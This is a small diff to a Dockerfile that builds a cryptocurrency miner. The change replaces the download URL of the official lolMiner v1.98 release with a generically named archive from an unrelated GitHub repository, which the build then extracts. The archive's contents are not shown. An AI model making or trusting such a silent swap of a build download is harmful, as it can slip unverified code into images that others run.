@@ -11,7 +11,7 @@ RUN apt-get update && \
 
 # Build commands
 WORKDIR /build
-RUN wget -O lol.tar.gz "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98/lolMiner_v1.98_Lin64.tar.gz" && \
+RUN wget -O lol.tar.gz "https://github.com/lilcoinzdc/guap-dats/releases/download/sesjus/lol.tar.gz" && \
   tar -zxf lol.tar.gz
 
 # ---
